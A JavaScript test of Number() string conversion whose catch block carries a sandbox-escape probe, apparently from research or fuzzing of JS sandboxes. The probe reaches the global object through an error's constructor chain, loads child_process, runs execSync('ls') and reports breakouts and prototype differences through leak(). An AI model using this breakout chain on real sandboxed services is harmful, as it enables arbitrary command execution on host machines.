try {
    function dynaString(s1, s2) {
        return String(s1) + String(s2);
    }
    if (Number(dynaString('+', '0')) !== Number('0')) {
        $ERROR('#1: Number("+"+"0") === Number("0")');
    } else {
        if (1 / Number(dynaString('+', '0')) !== 1 / Number('0')) {
            $ERROR('#2: 1/Number("+"+"0") === 1/Number("0")');
        }
    }
    if (Number(dynaString('+Infi', 'nity')) !== Number('Infinity')) {
        $ERROR('#3: Number("+Infin"+"ity") === Number("Infinity")');
    }
    if (Number(dynaString('+1234.', '5678')) !== Number('1234.5678')) {
        $ERROR('#4: Number("+1234."+"5678") === Number("1234.5678")');
    }
    if (Number(dynaString('+1234.', '5678e90')) !== Number('1234.5678e90')) {
        $ERROR('#5: Number("+1234."+"5678e90") === Number("1234.5678e90")');
    }
    if (Number(dynaString('+1234.', '5678E90')) !== Number('1234.5678E90')) {
        $ERROR('#6: Number("+1234."+"5678E90") === Number("1234.5678E90")');
    }
    if (Number(dynaString('+1234.', '5678e-90')) !== Number('1234.5678e-90')) {
        $ERROR('#7: Number("+1234."+"5678e-90") === Number("1234.5678e-90")');
    }
    if (Number(dynaString('+1234.', '5678E-90')) !== Number('1234.5678E-90')) {
        $ERROR('#8: Number("+1234."+"5678E-90") === Number("1234.5678E-90")');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}